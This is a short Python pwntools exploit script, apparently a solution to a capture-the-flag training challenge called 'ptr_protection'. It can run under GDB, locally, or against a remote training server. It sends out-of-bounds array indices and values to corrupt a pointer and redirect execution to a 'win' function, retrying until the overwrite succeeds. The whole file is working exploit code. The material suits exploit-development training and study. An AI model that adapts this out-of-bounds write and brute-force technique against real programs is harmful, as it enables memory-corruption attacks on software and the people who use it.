from pwn import *

CHALL_PATH = "./ptr_protection"
COMMANDS = """
b challenge
brva 0x152E
b win
c
"""

def attempt_exploit():
    # Choose the method of running (GDB, remote, or local process)
    if args.GDB:
        c = gdb.debug(CHALL_PATH, COMMANDS)
    elif args.REM:
        c = remote("ptr-protection.training.offensivedefensive.it", 8080, ssl=True)
    else:
        c = process(CHALL_PATH)

    try:
        # Interaction logic with the challenge binary
        for i in range(40, 42):
            c.recvuntil(b"index: ")
            c.sendline(str(i))

            c.recvuntil(b"data: ")
            if i == 40:
                c.sendline(b"124")
            else:
                c.sendline(b"0")

        c.recvuntil(b"index: ")
        c.sendline(b"-1")

        # Read the output and check if the exploit succeeded
        output = c.recvall(timeout=2)  # Set a timeout for reading the output

        # Check if "WIN!" is present in the output
        if b"WIN!" in output:
            print("Exploit succeeded!")
            print(output.decode())  # Optionally print the full output to see the flag
            return True

        return False

    except EOFError:
        # If the program crashes with a segmentation fault or similar, retry
        c.close()
        return False

# Retry the exploit until it succeeds
count = 0
while not attempt_exploit():
    count += 1
    print("Process crashed or failed. Retrying...")
    print("Attempt: ", count)
